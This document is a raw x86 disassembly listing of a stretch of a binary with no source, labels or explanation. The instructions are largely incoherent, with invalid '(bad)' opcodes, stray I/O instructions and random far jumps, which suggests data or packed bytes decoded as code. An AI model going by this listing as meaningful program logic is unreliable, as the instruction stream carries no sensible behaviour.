  41951f:	xor    DWORD PTR [esi],0x5fa2a703
  419525:	jl     0x419509
  419527:	scas   eax,DWORD PTR es:[edi]
  419528:	ja     0x419524
  41952a:	jmp    0x419585
  41952c:	jp     0x4195ab
  41952e:	push   0x5096b2f2
  419533:	cmc    
  419534:	lock and al,0xcc
  419537:	scas   eax,DWORD PTR es:[edi]
  419538:	cwde   
  419539:	popa   
  41953a:	inc    eax
  41953b:	nop
  41953c:	(bad)  
  41953d:	out    0x34,al
  41953f:	pop    esi
  419540:	jg     0x419557
  419542:	add    ch,cl
  419544:	jbe    0x4195ae
  419546:	test   eax,0x80dfa57a
  41954b:	cs in  al,dx
  41954d:	cwde   
  41954e:	pop    ebx
  41954f:	outs   dx,BYTE PTR ds:[esi]
  419550:	add    esi,DWORD PTR [ebx-0x2f]
  419553:	pop    ebx
  419554:	dec    ebx
  419556:	loope  0x41952a
  419558:	icebp  
  419559:	pop    ebx
  41955a:	xor    edi,DWORD PTR [eax]
  41955c:	adc    al,0x8a
  41955e:	push   ds
  41955f:	sub    al,0xbd
  419561:	shl    dh,0x12
  419564:	xchg   ebx,eax
  419565:	jmp    0x41959a
  419567:	dec    esp
  419568:	cld    
  419569:	push   edx
  41956a:	adc    esp,esp
  41956c:	push   esi
  41956d:	pop    esp
  41956e:	dec    esp
  41956f:	inc    ebx
  419570:	std    
  419571:	aas    
  419572:	dec    ecx
  419573:	cmp    al,ch
  419575:	test   BYTE PTR [eax],bl
  419577:	shl    BYTE PTR [edi+ebx*8-0x5185221c],1
  41957e:	inc    ebx
  41957f:	and    DWORD PTR [edx+0x71],esi
  419582:	inc    ebp
  419583:	xor    DWORD PTR [edx-0x6d],ecx
  419586:	pop    es
  419587:	mov    ecx,0xb20d4f2a
  41958c:	stc    
  41958d:	mov    DWORD PTR [ecx],0x11408c45
  419593:	mov    edx,0xa065f894
  419598:	call   0x9559a6cd
  41959d:	inc    edi
  41959e:	push   esi
  41959f:	dec    DWORD PTR [edi+0x74e106f]
  4195a5:	out    0xdf,eax
  4195a7:	daa    
  4195a8:	lock adc al,0xf2
  4195ab:	add    BYTE PTR [edi],al
  4195ad:	or     DWORD PTR [ecx+esi*8-0x44],edx
  4195b1:	or     bh,BYTE PTR [eax]
  4195b3:	push   edx
  4195b4:	jmp    0x4195a5
  4195b6:	hlt    
  4195b7:	or     eax,0x5d14944d
  4195bc:	rol    DWORD PTR [esi+0x6bca3183],cl
  4195c2:	jae    0x4195ba
  4195c4:	stc    
  4195c5:	jo     0x4195f1
  4195c7:	imul   esp,edx,0xffffffca
  4195ca:	pop    ds
  4195cb:	mov    eax,ds:0x86560c93
  4195d0:	stc    
  4195d1:	or     al,0x80
  4195d3:	in     al,dx
  4195d4:	jbe    0x41959f
  4195d6:	cmp    BYTE PTR [edx-0x40bae858],dh
  4195dc:	xor    eax,DWORD PTR [ebx+0x9772a80]
  4195e2:	and    BYTE PTR [edi+0x2116dd6],0x6b
  4195e9:	enter  0x3c05,0x1c
  4195ed:	mov    bl,0xd6
  4195ef:	(bad)  
  4195f0:	in     eax,dx
  4195f1:	inc    edx
  4195f2:	push   ss
  4195f3:	cmp    edx,DWORD PTR [edx+eax*4]
  4195f6:	fisttp WORD PTR [edx-0x6b]
  4195f9:	jl     0x419589
  4195fb:	sub    ebx,ebp
  4195fd:	jbe    0x4195ac
  4195ff:	stos   DWORD PTR es:[edi],eax
  419600:	out    dx,al
  419601:	lods   al,BYTE PTR ds:[esi]
  419602:	xchg   ebx,eax
  419603:	xor    DWORD PTR [ebx+0x3c0e0d0e],ecx
  419609:	in     eax,0x74
  41960b:	lea    edx,[ecx]
  41960d:	mov    ch,0x2a
  41960f:	mov    WORD PTR [edi],fs
  419611:	push   ecx
  419612:	pop    edx
  419613:	push   esp
  419614:	das    
  419615:	mov    eax,ds:0x1486019
  41961a:	mov    ds:0x12804b40,eax
  41961f:	adc    edx,DWORD PTR [ecx+0x67]
  419622:	sub    bl,al
  419624:	pushf  
  419625:	xchg   esi,eax
  419626:	push   ecx
  419627:	sti    
  419628:	pop    ecx
  419629:	sub    BYTE PTR [ebp+0x476eea77],bh
  41962f:	sbb    al,0x44
  419631:	adc    al,0xa1
  419633:	sbb    bh,BYTE PTR [esi-0x783eb806]
  419639:	jb     0x419608
  41963b:	or     ebp,esp
  41963d:	stc    
  41963e:	je     0x419619
  419640:	push   esp
  419641:	xchg   edx,eax
  419642:	js     0x4195f8
  419644:	test   BYTE PTR [edi],bh
  419646:	xchg   esp,eax
  419647:	pop    ebx
  419648:	mov    dl,0x4b
  41964a:	fldenv [ebx]
  41964c:	jmp    0xc696d4e7
  419651:	jb     0x419689
  419653:	mov    esp,0xc772d6b8
  419658:	mov    ecx,0x6790777c
  41965d:	xor    cl,BYTE PTR [esp+ebx*4-0x725e350f]
  419664:	add    al,0x22
  419666:	jbe    0x41967d
  419668:	cmp    BYTE PTR [ecx],ah
  41966a:	push   es
  41966b:	(bad)  
  41966c:	shl    cl,0x5e
  41966f:	(bad)
  419672:	dec    ecx
  419673:	call   0xedfd1168
  419678:	loop   0x419629
  41967a:	jns    0x419642
  41967c:	sub    esp,ebp
  41967e:	imul   BYTE PTR [edi+0x58440b13]
  419684:	inc    edx
  419685:	es imul ebx,ebp,0x13
  419689:	cmp    al,0xc7
  41968b:	xchg   DWORD PTR [ebx],edi
  41968d:	scas   al,BYTE PTR es:[edi]
  41968e:	and    al,0xbe
  419690:	or     DWORD PTR ds:0x7ef9fba6,0xffffff9a
  419697:	aaa    
  419698:	cmp    eax,0x78304a37
  41969d:	add    eax,DWORD PTR [ecx-0x511ffe4b]
  4196a3:	jb     0x4196c5
  4196a5:	xor    al,0xad
  4196a7:	out    0xc5,eax
  4196a9:	fwait
  4196aa:	pop    ebx
  4196ab:	fwait
  4196ac:	jb     0x41964d
  4196ae:	lock jp 0x419697
  4196b1:	cdq    
  4196b2:	jns    0x41967c
  4196b4:	pop    ebp
  4196b5:	add    BYTE PTR [ecx+0x3521aa4e],cl
  4196bb:	mov    al,ds:0xb96fb610
  4196c0:	sbb    ah,0x77
  4196c3:	cwde   
  4196c4:	and    eax,0x4f0b02cf
  4196c9:	and    cl,BYTE PTR [ecx]
  4196cb:	inc    esp
  4196cc:	(bad)  
  4196cd:	shl    BYTE PTR [ebp*4-0x173117aa],0xda
  4196d5:	push   ss
  4196d6:	ror    DWORD PTR [esi+0x322236e7],0x54
  4196dd:	fcomip st,st(7)
  4196df:	ret    0x8995
  4196e2:	add    al,0xde
  4196e4:	push   ebp
  4196e5:	hlt    
  4196e6:	jle    0x419751
  4196e8:	inc    esp
  4196e9:	or     cl,BYTE PTR [edx-0x36bcca75]
  4196ef:	xchg   esp,eax
  4196f0:	or     esp,DWORD PTR [ebx-0x2f]
  4196f3:	int3   
  4196f4:	dec    edi
  4196f5:	adc    eax,DWORD PTR [edx+edi*4+0x2039ceb5]
  4196fc:	aaa    
  4196fd:	xchg   edi,eax
  4196fe:	retf   
  4196ff:	dec    ebx
  419700:	je     0x41970c
  419702:	push   ecx
  419703:	dec    edx
  419704:	rcr    BYTE PTR [ebp+0x27ac07b5],1
  41970a:	mov    ebp,0x258030de
  41970f:	dec    esi
  419710:	fwait
  419711:	jle    0x41978d
  419713:	adc    DWORD PTR [ecx+0x3a3ddca8],eax
  419719:	(bad)  
  41971a:	cwde   
  41971b:	shr    DWORD PTR [ebp-0x51],0x5
  41971f:	out    0xa7,al
  419721:	dec    ebp
  419722:	add    dh,BYTE PTR [eax]
  419724:	stos   DWORD PTR es:[edi],eax
  419725:	fild   QWORD PTR [ebp+0x47e63e88]
  41972b:	ret    0x20cb
  41972e:	add    al,0x40
  419730:	or     BYTE PTR [edi-0x3f680bb5],ch
  419736:	mov    ch,0xfd
  419738:	fcmovb st,st(0)
  41973a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41973b:	cdq    
  41973c:	fs (bad) 
  419740:	mov    bh,0x5d
  419742:	jo     0x41974c
  419744:	sbb    al,0x30
  419746:	mov    al,ds:0x6dd8b47b
  41974b:	lods   eax,DWORD PTR ds:[esi]
  41974c:	int3   
  41974d:	push   ebx
  41974e:	daa    
  41974f:	xchg   ecx,eax
  419750:	daa    
  419751:	xchg   esp,eax
  419752:	add    cl,cl
  419754:	hlt    
  419755:	aas    
  419756:	out    dx,al
  419757:	rcl    DWORD PTR gs:[ebp-0x3a23394d],1
  41975e:	dec    ecx
  41975f:	mov    db5,ebx
  419762:	std    
  419763:	pop    ds
  419764:	jo     0x41978f
  419766:	xchg   dl,bh
  419768:	sbb    ch,BYTE PTR [edi-0x42]
  41976b:	mov    dh,0x77
  41976d:	sub    ecx,DWORD PTR [esi+0x1]
  419770:	jmp    0x4d17:0x10d58e00
  419777:	aad    0x73
  419779:	js     0x41979c
  41977b:	mov    ds:0x8044c035,al
  419780:	mov    esp,0x74f0b4c5
  419786:	xchg   ebx,eax
  419787:	xchg   esi,eax
  419788:	pop    ecx
  419789:	push   cs
  41978a:	jns    0x4197c1
  41978c:	int3   
  41978d:	sbb    ebx,DWORD PTR [esi]
  41978f:	fild   WORD PTR [ebx]
  419791:	sbb    eax,0xbc61c53d
  419796:	shl    DWORD PTR [eax+0x53],cl
  419799:	je     0x4197b1
  41979b:	aas    
  41979c:	cmp    ch,BYTE PTR [ecx]
  41979e:	xchg   ecx,eax
  41979f:	and    edi,edx
  4197a1:	in     eax,dx
  4197a2:	push   esi
  4197a3:	push   edx
  4197a4:	xchg   DWORD PTR [edx-0x65],ebx
  4197a7:	cdq    
  4197a8:	inc    edx
  4197a9:	and    BYTE PTR [edi+ecx*4],ah
  4197ac:	es pop edx
  4197ae:	ret    
  4197af:	dec    ecx
  4197b0:	(bad)  
  4197b1:	jg     0x419748
  4197b3:	cmp    eax,0xbd67016b
  4197b8:	sbb    esp,DWORD PTR [esi+0x57]
  4197bb:	loop   0x4197be
  4197bd:	sub    DWORD PTR [ebx+0x7767cc5],0xffffff9f
  4197c4:	xor    edi,ebp
  4197c6:	push   ebp
  4197c7:	ins    DWORD PTR es:[edi],dx
  4197c8:	mov    dl,0x25
  4197ca:	mov    bl,0x2a
  4197cc:	pop    ecx
  4197cd:	hlt    
  4197ce:	mov    BYTE PTR [esi-0x76],dl
  4197d1:	popf   
  4197d2:	lods   eax,DWORD PTR ds:[esi]
  4197d3:	inc    edx
  4197d4:	test   eax,0xffe082cf
  4197d9:	pop    ds
  4197da:	cmp    edx,DWORD PTR [ebp-0xb]
  4197dd:	das    
  4197de:	pop    ds
  4197df:	xor    ch,BYTE PTR [edx]
  4197e1:	scas   eax,DWORD PTR es:[edi]
  4197e2:	cmp    eax,0x3299901
  4197e7:	rol    BYTE PTR [edi],0x1b
  4197ea:	leave  
  4197eb:	pusha  
  4197ec:	cmovle edi,DWORD PTR [eax-0x50]
  4197f0:	lods   eax,DWORD PTR ds:[esi]
  4197f1:	test   DWORD PTR [ebx-0x18],0x8885bd9f
  4197f8:	call   0xd9a9:0x78262bd5
  4197ff:	fldenv [ecx-0x7ee2edb8]
  419805:	(bad)  
  419806:	push   ebp
  419807:	xor    DWORD PTR [edx],ecx
  419809:	xor    dh,BYTE PTR [ebp-0x551f5033]
  41980f:	popa   
  419810:	in     eax,dx
  419811:	ror    dh,1
  419813:	push   ss
  419814:	pop    ebx
  419815:	mov    WORD PTR [esi-0x5f7d28a3],fs
  41981b:	add    DWORD PTR [eax+0x6b],ecx
  41981e:	jecxz  0x41984f
  419820:	imul   edi,DWORD PTR [ebx],0x281eca16
  419826:	push   ecx
  419827:	bound  edi,QWORD PTR ds:0xc48a3164
  41982d:	mov    cl,0x9d
  41982f:	scas   al,BYTE PTR es:[edi]
  419830:	repz mov edx,0xb31ca646
  419836:	in     eax,0xa
  419838:	sbb    eax,0x5d019aeb
  41983d:	or     edi,ebx
  41983f:	rcr    BYTE PTR [ebx],1
  419841:	aaa    
  419842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419843:	mov    esi,0x544d643b
  419848:	pushf  
  419849:	push   ebp
  41984a:	jae    0x419847
  41984c:	(bad)  
  41984d:	sbb    DWORD PTR [ebx-0xf0561ba],edx
  419853:	add    DWORD PTR [eax],edx
  419855:	outs   dx,DWORD PTR ds:[esi]
  419856:	inc    ebp
  419857:	sub    al,0xcc
  419859:	scas   al,BYTE PTR es:[edi]
  41985a:	inc    eax
  41985b:	call   0x9522:0xf77a416e
  419862:	push   ebx
  419863:	scas   al,BYTE PTR es:[edi]
  419864:	mov    al,ds:0x7008ba2c
  419869:	add    BYTE PTR [edx],0xf1
  41986c:	xor    BYTE PTR [edx-0x2df763ae],ch
  419872:	retf   
  419873:	rcr    dl,1
  419875:	js     0x419876
  419877:	int3   
  419878:	or     edi,esi
  41987a:	add    esi,edx
  41987c:	sub    al,0x3d
  41987e:	aas    
  41987f:	leave  
  419880:	lea    ecx,[ebx+edx*4+0x34]
  419884:	pushf  
  419885:	and    dh,ch
  419887:	pop    ds
  419888:	jg     0x4198f5
  41988a:	mov    al,ds:0xbefd54f3
  41988f:	inc    ebx
  419890:	(bad)  
  419891:	adc    bl,BYTE PTR [edi]
  419893:	jnp    0x41984e
  419895:	mov    al,ds:0xd42759b7
  41989a:	xor    esi,DWORD PTR fs:[eax+edi*2+0x71]
  41989f:	inc    edx
  4198a0:	jmp    0x6d0b:0xc89f1f58
  4198a7:	(bad)  
  4198a8:	into   
  4198a9:	xchg   BYTE PTR [ecx+0x1f],ah
  4198ac:	add    ebx,edi
  4198ae:	nop
  4198af:	or     al,0xbf
  4198b1:	push   esp
  4198b2:	or     al,0xd8
  4198b4:	nop
  4198b5:	sbb    cl,BYTE PTR [eax+0x7c]
  4198b8:	mov    ecx,0x3b31bb23
  4198bd:	ret    
  4198be:	mov    ebp,0xdf65b0a1
  4198c3:	mov    edx,DWORD PTR [edx]
  4198c5:	jmp    DWORD PTR [ecx+0x6b]
  4198c8:	repnz (bad) 
  4198ca:	jle    0x419912
  4198cc:	(bad)  
  4198cd:	cld    
  4198ce:	cmp    DWORD PTR [edx+edi*1],0xffffffb4
  4198d2:	and    DWORD PTR [ebx+0x418da0bb],esp
  4198d8:	mov    eax,ds:0x7660e12e
  4198dd:	neg    DWORD PTR [eax+0x38a2171e]
  4198e3:	and    al,0x13
  4198e5:	add    eax,0xe845dd81
  4198ea:	add    ebp,DWORD PTR [ebp+0x4b7a9fda]
  4198f0:	sub    DWORD PTR [esp+ecx*8+0x5c],eax
  4198f4:	std    
  4198f5:	xor    al,0x5c
  4198f7:	cs mov ah,0xb9
  4198fa:	sti    
  4198fb:	in     eax,0x3a
  4198fd:	in     eax,dx
  4198fe:	mov    edi,0xe1231766
  419903:	mov    ebx,DWORD PTR [esi-0x78212923]
  419909:	test   al,0x33
  41990b:	test   DWORD PTR [eax],ebx
  41990d:	fldenv [esi]
  41990f:	int    0x70
  419911:	pop    esi
  419912:	popf   
  419913:	sub    edi,ebp
  419915:	push   0x5b
  419917:	(bad)  
  419918:	jecxz  0x419997
  41991a:	lea    ebp,[esi+0x69]
  41991d:	retf   
  41991e:	bswap  edx
  419920:	sbb    al,0x7c
  419922:	es mov ebp,0x8d37bce0
  419928:	xchg   edx,eax
  419929:	sub    al,0x1b
  41992b:	(bad)  
  41992c:	(bad)  
  41992d:	test   BYTE PTR [ebx-0x61962d3e],0xfc
  419934:	mov    dl,0x5f
  419936:	add    DWORD PTR [ecx+0x7f9eae25],ecx
  41993c:	test   DWORD PTR [eax-0x1c],eax
  41993f:	(bad)  
  419941:	xchg   ebx,eax
  419942:	cmp    eax,0x58d6aa3c
  419947:	xchg   edx,eax
  419948:	out    dx,al
  419949:	adc    ch,ch
  41994b:	ins    DWORD PTR es:[edi],dx
  41994c:	jge    0x41996f
  41994e:	or     al,0xcd
  419950:	sub    ebx,0x1bd5acd4
  419956:	dec    ecx
  419957:	loop   0x419933
  419959:	test   esi,esi
  41995b:	pop    esp
  41995c:	jo     0x4199b8
  41995e:	icebp  
  41995f:	fidiv  DWORD PTR [ebx]
  419961:	push   cs
  419962:	daa    
  419963:	je     0x4199ca
  419965:	push   esi
  419966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419967:	push   ds
  419968:	(bad)  
  419969:	leave  
  41996a:	gs ret 0xcbba
  41996e:	leave  
  41996f:	jle    0x41994d
  419971:	clc    
  419972:	xor    ecx,DWORD PTR [edx-0x7884591e]
  419978:	sbb    edx,DWORD PTR [eax+0x74134c9f]
  41997e:	and    eax,0xac57b906
  419983:	cli    
  419984:	test   BYTE PTR [ebp-0x490f3dd9],0xb5
  41998b:	test   al,0xf0
  41998d:	dec    ecx
  41998e:	jns    0x419951
  419990:	mov    ds:0xedbc1df1,eax
  419995:	push   esp
  419996:	aas    
  419997:	lods   al,BYTE PTR ds:[esi]
  419998:	mov    eax,ds:0x223cefb
  41999d:	or     dh,dl
  41999f:	mov    ah,bl
  4199a1:	(bad)  
  4199a2:	sub    DWORD PTR [ecx+0x22bc357],0x6
  4199a9:	pminub mm0,QWORD PTR [esp+edx*4]
  4199ad:	test   dh,dl
  4199af:	jnp    0x4199c6
  4199b1:	xor    DWORD PTR [ebp+0x74],0x2e6d2840
  4199b8:	int3   
  4199b9:	scas   al,BYTE PTR es:[edi]
  4199ba:	retf   0x95ca
  4199bd:	cmp    ebp,DWORD PTR [esi]
  4199bf:	sbb    eax,0x1695edd2
  4199c4:	jns    0x419961
  4199c6:	cmc    
  4199c7:	mov    ds:0x286770ce,al
  4199cc:	shr    DWORD PTR [edi-0x43],0xdc
  4199d0:	data16 jbe 0x4199b9
  4199d3:	(bad)  
  4199d4:	sahf   
  4199d5:	aam    0x35
  4199d7:	imul   eax,DWORD PTR [esi],0x51fb901d
  4199dd:	pop    esi
  4199de:	fwait
  4199df:	mov    al,ds:0xf9c2d168
  4199e4:	loope  0x419a3e
  4199e6:	push   cs
  4199e7:	imul   esi,ecx,0x4d
  4199ea:	retf   0x8df2
  4199ed:	test   al,0x96
  4199ef:	lds    edx,FWORD PTR [ecx]
  4199f1:	and    cl,bh
  4199f3:	mov    bh,0x61
  4199f5:	mov    edi,0xdaf10732
  4199fb:	sbb    dh,BYTE PTR [edx]
  4199fd:	fwait
  4199fe:	cdq    
  4199ff:	jb     0x4199b1
  419a01:	inc    esi
  419a02:	aaa    
  419a03:	jo     0x419a11
  419a05:	mov    dl,ch
  419a07:	inc    ecx
  419a08:	lods   eax,DWORD PTR ds:[esi]
  419a09:	test   DWORD PTR [edx+0x5fd2b49c],0x10912d49
  419a13:	mov    DWORD PTR ds:0xdd74bbdd,eax
  419a19:	xor    edx,DWORD PTR [ecx]
  419a1b:	adc    al,0xb6
  419a1d:	and    BYTE PTR [ebp+0x38],ch
  419a20:	mov    eax,ds:0xbe296b1a
  419a25:	cdq    
  419a26:	add    al,0x4b
  419a28:	dec    esi
  419a29:	or     al,0xc4
  419a2b:	gs jp  0x4199eb
  419a2e:	jnp    0x419a48
  419a30:	jb     0x4199d8
  419a32:	inc    esp
  419a33:	pusha  
  419a34:	ss repnz call 0xc81c:0x811826c9
  419a3d:	adc    bh,BYTE PTR [edi-0x78c1a447]
  419a43:	cmp    DWORD PTR [edx],esi
  419a45:	or     ecx,edi
  419a47:	in     eax,0x94
  419a49:	push   edx
  419a4a:	xor    DWORD PTR [esi-0x5],esp
  419a4d:	nop
  419a4e:	scas   eax,DWORD PTR es:[edi]
  419a4f:	shl    DWORD PTR [edx+0x42],1
  419a52:	sub    dl,dh
  419a54:	addr16 jmp 0xb434:0xa098a111
  419a5c:	test   BYTE PTR [edx-0x6b],0xba
  419a60:	jno    0x419a1f
  419a62:	ret    0xab4d
  419a65:	xor    al,0xcd
  419a67:	(bad)  
  419a68:	pop    esp
  419a69:	xor    al,0x5c
  419a6b:	mov    al,ds:0xc7e8eda9
  419a70:	pop    es
  419a71:	jmp    0x419a86
  419a73:	sar    BYTE PTR ds:0xfb2bfe52,0x25
  419a7a:	mov    ecx,0x57ad32f
  419a7f:	pop    ds
  419a80:	(bad)  
  419a82:	test   BYTE PTR [eax+0x18],dh
  419a85:	sbb    al,0xa8
  419a87:	daa    
  419a88:	loopne 0x419a0a
  419a8a:	push   si
  419a8c:	aam    0x1b
  419a8e:	dec    esp
  419a8f:	popa   
  419a90:	addr16 mov cl,0x7c
  419a93:	scas   eax,DWORD PTR es:[edi]
  419a94:	mov    ds:0xdfbb1ba2,al
  419a99:	or     BYTE PTR [eax],dl
  419a9b:	sub    bh,BYTE PTR [edx+eiz*2-0x6d]
  419a9f:	adc    al,0xd6
  419aa1:	cmp    eax,0x51a49908
  419aa6:	test   eax,0xa6c2b24a
  419aab:	fcom   QWORD PTR [edx-0x53]
  419aae:	ror    DWORD PTR [ebx+0xdaae63b],cl
  419ab4:	sar    dl,cl
  419ab6:	xchg   ebp,ebp
  419ab8:	rol    eax,1
  419aba:	inc    ecx
  419abb:	fnsave [ebx-0x7c]
  419abe:	mov    ds:0xc51c717,eax
  419ac3:	mov    ebx,0xa70bb2df
  419ac8:	add    esi,DWORD PTR [ecx+0x528644ab]
  419ace:	jno    0x419a5f
  419ad0:	pop    edi
  419ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ad2:	inc    esi
  419ad3:	stos   BYTE PTR es:[edi],al
  419ad4:	mov    dl,BYTE PTR [ebx+eax*1-0x3a]
  419ad8:	xchg   edx,eax
  419ad9:	rcpps  xmm3,XMMWORD PTR [edi-0x5c]
  419add:	mov    eax,ds:0x1dff7138
  419ae2:	orps   xmm1,XMMWORD PTR [ecx-0xc]
  419ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ae7:	ret    
  419ae8:	ror    DWORD PTR [esi-0x4],1
  419aeb:	(bad)
  419aef:	jmp    0x17a6:0xd587e9fc
  419af6:	push   cs
  419af7:	stc    
  419af8:	mov    bl,0x7
  419afa:	ret    
  419afb:	jge    0x419b14
  419afd:	ret    
  419afe:	and    eax,0xc5c45e8a
  419b03:	and    dl,al
  419b05:	adc    al,0xdb
  419b07:	aaa    
  419b08:	fistp  WORD PTR [edi+esi*2+0x1b]
  419b0c:	cs call 0x6e116211
  419b12:	inc    eax
  419b13:	pop    ebx
  419b14:	push   ebp
  419b15:	int3   
  419b16:	out    dx,eax
  419b17:	xor    al,0x22
  419b19:	push   es
  419b1a:	aad    0x36
  419b1c:	push   eax
  419b1d:	and    BYTE PTR [edi+0x5d1f86b3],0x44
  419b24:	repz adc BYTE PTR [ebx+0x77454d6f],ah
  419b2b:	cli    
  419b2c:	es ret 
  419b2e:	xchg   BYTE PTR [ebp-0x46],bl
  419b31:	(bad)  
  419b32:	ficom  WORD PTR [edx+ebp*1+0x2dbf9e5b]
  419b39:	adc    eax,0xa14c94bc
  419b3e:	jns    0x419ae9
  419b40:	jmp    0x9f905b76
  419b45:	lds    edi,FWORD PTR [edx+edx*8-0x58]
  419b49:	xchg   edi,eax
  419b4a:	jno    0x419bab
  419b4c:	mov    dh,0xb0
  419b4e:	sub    BYTE PTR [edi+0x2b],dl
  419b51:	retf   
  419b52:	jp     0x419bc0
  419b54:	mov    ds:0x863f7ccd,al
  419b59:	push   0x3c435b7
  419b5e:	cmp    ah,BYTE PTR [eax-0x6b]
  419b61:	adc    eax,DWORD PTR [edx]
  419b63:	jae    0x419b89
  419b65:	lods   eax,DWORD PTR ds:[esi]
  419b66:	inc    ecx
  419b67:	mov    al,bh
  419b69:	dec    ebp
  419b6a:	mov    BYTE PTR [ebx],bl
  419b6c:	xor    al,0xd3
  419b6e:	pop    eax
  419b6f:	stc    
  419b70:	dec    ebp
  419b71:	jmp    0x372c:0x972598a4
  419b78:	pop    ebp
  419b79:	mov    eax,0x9e3ab0f8
  419b7e:	aaa    
  419b7f:	inc    eax
  419b80:	xchg   edi,eax
  419b81:	lods   eax,DWORD PTR ds:[esi]
  419b82:	pop    eax
  419b83:	js     0x419b2b
  419b85:	icebp  
  419b86:	popa   
  419b87:	inc    ecx
  419b88:	fdivrp st(4),st
  419b8a:	js     0x419b14
  419b8c:	ror    ch,cl
  419b8e:	pop    ecx
  419b8f:	cld    
  419b90:	scas   eax,DWORD PTR es:[edi]
  419b91:	add    eax,0xb0a8d0f2
  419b96:	test   eax,0xf5dbd12
  419b9b:	pop    edx
  419b9c:	(bad)  
  419b9d:	push   esi
  419b9e:	loope  0x419b30
  419ba0:	mov    al,0xd9
  419ba2:	ds or  bh,dl
  419ba5:	adc    edx,DWORD PTR [edx]
  419ba7:	sbb    DWORD PTR [esi+edx*1+0x6281baba],edx
  419bae:	gs ret 0x9fd0
  419bb2:	ret    
  419bb3:	dec    ecx
  419bb4:	push   edx
  419bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bb6:	dec    ecx
  419bb7:	xor    DWORD PTR ds:0xab89fab0,ebp
  419bbd:	dec    ebp
  419bbe:	mov    esp,edi
  419bc0:	pop    edx
  419bc1:	sub    esi,DWORD PTR [ecx-0x7fd953e5]
  419bc7:	ins    BYTE PTR es:[edi],dx
  419bc8:	push   ecx
  419bc9:	std    
  419bca:	lahf   
  419bcb:	inc    ebx
  419bcc:	daa    
  419bcd:	pop    ebx
  419bce:	jno    0x419c36
  419bd0:	js     0x419bc8
  419bd2:	cli    
  419bd3:	cmp    al,0xdd
  419bd5:	pop    edx
  419bd6:	add    al,0xd5
  419bd8:	in     al,0xbc
  419bda:	xchg   ebp,eax
  419bdb:	xor    cl,BYTE PTR [ebp-0x3c]
  419bde:	in     eax,dx
  419bdf:	mov    ds:0xe6b5373f,eax
  419be4:	std    
  419be5:	sbb    DWORD PTR [eax+0x4a],edx
  419be8:	mov    bh,0xee
  419bea:	dec    ebx
  419beb:	adc    eax,0x47fddf14
  419bf0:	ret    0x23d5
  419bf3:	mov    eax,DWORD PTR [ebp-0x67e13db1]
  419bf9:	mov    cl,0x6d
  419bfb:	cmp    DWORD PTR [ebp-0x7d],eax
  419bfe:	stos   BYTE PTR es:[edi],al
  419bff:	(bad)  
  419c00:	jns    0x419b8f
  419c02:	xor    DWORD PTR [ebx],esp
  419c04:	ror    DWORD PTR [eax-0x6f],cl
  419c07:	ds pop esi
  419c09:	mov    ebx,0x12e60472
  419c0e:	shl    ch,1
  419c10:	sub    esi,ebx
  419c12:	push   esi
  419c13:	es pop edx
  419c15:	adc    eax,DWORD PTR ds:0x5cd7affc
  419c1b:	(bad)  
  419c1c:	iret   
  419c1d:	sub    bl,dl
  419c1f:	adc    cl,ah
  419c21:	fnsetpm(287 only) 
  419c23:	or     al,BYTE PTR [edx-0x9]
  419c26:	push   edx
  419c27:	xor    DWORD PTR [ebp+0x1e],eax
  419c2a:	add    BYTE PTR [eax-0x56],dh
  419c2d:	mov    ebx,0x889c0181
  419c32:	(bad)  
  419c33:	fadd   QWORD PTR [eax]
  419c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c36:	mov    al,0xf9
  419c38:	mov    esi,0x7173aea9
  419c3d:	shl    DWORD PTR [eax+0x7e],1
  419c40:	xchg   edx,eax
  419c41:	or     al,0xc3
  419c43:	jno    0x419be3
  419c45:	mov    cl,cl
  419c47:	cmp    BYTE PTR [eax],dh
  419c49:	mov    ds:0x390ad19c,eax
  419c4e:	push   ecx
  419c4f:	lock and DWORD PTR [ebx-0x9],esp
  419c53:	cwde   
  419c54:	jno    0x419c45
  419c56:	cmp    al,dh
  419c58:	ret    
  419c59:	pop    es
  419c5a:	js     0x419c45
  419c5c:	retf   0x3d1a
  419c5f:	mov    esi,0x3db80539
  419c64:	lods   eax,DWORD PTR ds:[esi]
  419c65:	xchg   edx,eax
  419c66:	or     al,bl
  419c68:	cwde   
  419c69:	out    0x4b,al
  419c6b:	fld    QWORD PTR [edx-0x63]
  419c6e:	lock (bad) 
  419c70:	ficom  WORD PTR [ebx]
  419c72:	les    edx,FWORD PTR [ebp+0x1f790541]
  419c78:	mov    edi,0xdb5b2d22
  419c7d:	dec    esi
  419c7e:	ins    BYTE PTR es:[edi],dx
  419c7f:	xchg   edi,eax
  419c80:	lods   al,BYTE PTR ds:[esi]
  419c81:	out    0x39,al
  419c83:	jb     0x419cce
  419c85:	jecxz  0x419c2b
  419c87:	je     0x419c92
  419c89:	es jle 0x419c48
  419c8c:	aad    0x9e
  419c8e:	jp     0x419c99
  419c90:	cmp    eax,0xb19c9c9f
  419c95:	jns    0x419cbc
  419c97:	int3   
  419c98:	jg     0x419c32
  419c9a:	add    edx,esi
  419c9c:	ins    DWORD PTR es:[edi],dx
  419c9d:	jbe    0x419c1f
  419c9f:	packsswb mm0,mm7
  419ca2:	mov    eax,0x96078415
  419ca7:	(bad)  
  419ca8:	mov    ch,0x7a
  419caa:	test   dl,ch
  419cac:	and    ecx,DWORD PTR [ebx-0x1908f1cc]
  419cb2:	nop
  419cb3:	jmp    0x419d03
  419cb5:	cwde   
  419cb6:	push   edi
  419cb7:	jo     0x419c4d
  419cb9:	add    DWORD PTR [ecx-0x2f2736fe],0x1657d2f1
  419cc3:	dec    edi
  419cc4:	or     eax,0x63ddd1ad
  419cc9:	stc    
  419cca:	je     0x419cbf
  419ccc:	fsubr  QWORD PTR [ebp+0x35]
  419ccf:	aad    0xcd
  419cd1:	fmul   QWORD PTR [esi-0x12]
  419cd4:	lea    ecx,[ebx+esi*2-0x2804d9fe]
  419cdb:	add    al,0x2d
  419cdd:	arpl   WORD PTR [edi-0x1d],si
  419ce0:	cdq    
  419ce1:	jmp    FWORD PTR [ebp-0x48]
  419ce4:	lock mov bh,0x25
  419ce7:	outs   dx,BYTE PTR ds:[esi]
  419ce8:	cs pop eax
  419cea:	div    bh
  419cec:	push   esp
  419ced:	mov    ah,0x96
  419cef:	mov    esi,0x8668c0d4
